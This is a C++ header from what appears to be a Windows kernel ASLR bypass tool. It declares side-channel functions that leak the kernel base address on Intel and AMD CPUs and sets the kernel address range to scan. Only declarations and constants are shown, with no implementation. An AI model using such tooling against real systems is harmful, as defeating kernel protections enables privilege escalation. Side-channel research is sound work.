#pragma once
#include "utils/prefectch/global_var.hpp"
#include <cstdio>
#include <cstdlib>
#include <Windows.h>
#include <winternl.h>

// #include <cmath>


#define KERNEL_LOWER_BOUND 0xfffff80000000000ull
#define KERNEL_UPPER_BOUND 0xfffff80800000000ull

#define SCAN_START KERNEL_LOWER_BOUND
#define SCAN_END KERNEL_UPPER_BOUND

//#define KERNEL_SECTIONS 10
#define KERNEL_SECTIONS 0xC
#define DIFF 3

#define ARR_SIZE (SCAN_END - SCAN_START) / STEP

#define STEP 0x100000
#define ITERATIONS 0x100
#define DUMMY_ITERATIONS 5

typedef enum _CPU_VENDOR {
    CpuUnknown,
    CpuIntel,
    CpuIntelN200,
    CpuAmd,
    CpuAmdMobile
} CPU_VENDOR;


EXTERN_C void bad_syscall();
EXTERN_C UINT64 sidechannel(PVOID ptr);
ULONG_PTR KALSR_Bypass();

int average_sidechannel(PVOID addr);

UINT64 address_to_index(UINT64 addr);

BOOL is_below_average(UINT32 val);

UINT64 leak_kernel_base_amd_mobile();


UINT64 leak_kernel_base_amd_mobile_reliable();



UINT64 leak_kernel_base_amd();

// repeatedly try to leak the kernel base on amd. once two in a row match it will return
UINT64 leak_kernel_base_amd_reliable();

UINT64 most_frequent(UINT64* arr, int n);

// single attempt of finding the kernel base on intel N200
UINT64 leak_kernel_base_intel_n200();

UINT64 leak_kernel_base_intel_n200_reliable();

// single attempt of finding the kernel base on intel
UINT64 leak_kernel_base_intel();


UINT64 leak_kernel_base_intel_old();

UINT64 leak_kernel_base_intel_reliable();

VOID print_timings();

CPU_VENDOR determine_cpu_vendor();

UINT64 leak_kernel_base_reliable();
